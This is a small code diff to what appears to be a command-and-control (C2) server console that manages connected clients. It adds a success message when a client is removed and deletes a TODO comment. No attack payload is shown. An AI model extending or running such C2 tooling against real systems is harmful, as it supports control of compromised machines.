@@ -177,6 +177,7 @@ def removeClient(client):
             if currentClient in HOSTNAMES[host].clients:
                 HOSTNAMES[host].removeClient(currentClient)
         client.socket.close()
+        print("Removed client successfully")
     except Exception as e: 
         client.socket.close()
 
@@ -205,7 +206,7 @@ def copyKey(client_sock):
     
 def resetAll():
     for client in CURRENT_CONNECTIONS_CLASS:
-        removeClient(client) #TODO Might break things
+        removeClient(client) 
 
 #Main Console for C2
 def handleCommand():
